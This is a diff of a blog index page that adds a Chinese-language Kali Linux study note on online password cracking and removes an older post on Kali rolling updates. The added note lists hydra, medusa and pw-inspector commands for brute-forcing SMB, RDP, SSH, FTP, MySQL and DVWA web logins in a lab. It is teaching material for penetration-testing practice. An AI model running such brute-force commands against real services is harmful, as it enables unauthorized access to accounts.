@@ -240,6 +240,299 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十)：在线密码破解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:23+08:00">
+                2020-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
+<li>在线密码破解–对在线服务的密码破解</li>
+<li>离线密码破解–非在线服务的密码破解</li>
+<li>Hydra<ul>
+<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
+<li>-vV（查看详细信息）</li>
+<li>-t（并发连接数）</li>
+<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
+<li>-s（非默认输入端口）</li>
+<li>-L（自定义密码文件）</li>
+<li>-P（系统密码文件）</li>
+</ul>
+</li>
+<li>Windows密码破解<ul>
+<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
+</ul>
+</li>
+<li>Linux密码破解<ul>
+<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
+<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
+<li>▲ 日志服务器的报警</li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
+<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
+</ul>
+</li>
+<li>图形化界面<ul>
+<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
+<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
+</ul>
+</li>
+<li>HTTP表单身份认证<ul>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
+<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
+<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
+<li>C：先访问指定页面取得cookie </li>
+<li>H：指定http头</li>
+</ul>
+</li>
+<li>https-post-form、https-get-form、https-get-form</li>
+<li>-S:使用SSL连接</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
+<li>pw-inspector<ul>
+<li>按长度和字符集筛选字典</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
+<li>-m（最小位数）</li>
+<li>-M（最大位数）</li>
+</ul>
+</li>
+<li>密码破解效率<ul>
+<li>密码复杂度（字典命中率）</li>
+<li>带宽、协议、服务器性能、客户端性能</li>
+<li>锁定阈值</li>
+<li>单位时间最大登陆请求次数</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
+<li>Hydra的缺点<ul>
+<li>稳定性差，程序时常崩溃</li>
+<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
+<li>每主机新建过程，每服务新建实例</li>
+<li>大量目标破解时性能差</li>
+<li>▲ 对CPU以及存储空间占用较大</li>
+</ul>
+</li>
+<li>Medusa的特点<ul>
+<li>稳定性好（单主机、多主机）</li>
+<li>速度控制得当</li>
+<li>基于线程</li>
+<li>支持模块少于hydra（不支持RDP）</li>
+<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
+</ul>
+</li>
+<li>常用参数<ul>
+<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
+<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
+<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
+<li>-m（大模块相应的参数）    </li>
+<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
+<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
+<li>-F（获取一个即停止）</li>
+<li>-T 数字（并发主机数）</li>
+<li>-v 数字（显示破解过程的详细信息程度）</li>
+<li>-n 端口（使用端口）</li>
+<li>-s （使用SSL连接）</li>
+</ul>
+</li>
+<li>破解Windows密码<ul>
+<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
+<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
+</ul>
+</li>
+<li>破解Linux SSH密码（Metasploit）<ul>
+<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
+<li>网站的在线密码破解</li>
+<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
+<li>多种Hash值：<a href="https://1024tools.com/hash" target="_blank" rel="noopener">https://1024tools.com/hash</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3440,226 +3733,6 @@ A：可用性（Availability）指保证合法用户对信息和资源的使用�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  232 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
-<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
-<li>Fixed-release<ul>
-<li>固定发布周期</li>
-<li>使用软件稳定的主流版本（发布–主流–作废）</li>
-<li>更稳定，适合于企业生成环境</li>
-</ul>
-</li>
-<li>Rolling release<ul>
-<li>适用于开发者和技术人员</li>
-<li>连续升级新版本，追求在新功能出现后最快使用</li>
-<li>正式成为流行</li>
-</ul>
-</li>
-<li>Kali 2.0 rolling release<ul>
-<li>采用debian testing库作为更新源</li>
-</ul>
-</li>
-<li>软件包追踪<ul>
-<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
-</ul>
-</li>
-<li>VMware Tools vs Open-VM-Tools<ul>
-<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
-</ul>
-</li>
-<li>Gnome 3.18</li>
-<li>4.3内核</li>
-<li>Kali 2.0现有版本升级</li>
-</ul>
-<blockquote>
-<pre><code>⭐现有版本更新
-cat &lt;&lt; EOF &gt; /etc/apt/sources.list
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-EOF
-
-⭐安装命令
-apt-get update
-apt-get dist-upgrade 
-reboot
-
-⭐查看版本号，代码号
-lsb_release -a</code></pre></blockquote>
-<ul>
-<li>Kali sana库于2016年4月15日停止更新</li>
-<li>工具有所更新</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3714,7 +3787,7 @@ lsb_release -a</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">145</span>
+                  <span class="site-state-item-count">146</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3821,7 +3894,7 @@ lsb_release -a</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">129.5k</span>
+    <span title="Site words total count">130.3k</span>
   
 </div>
 
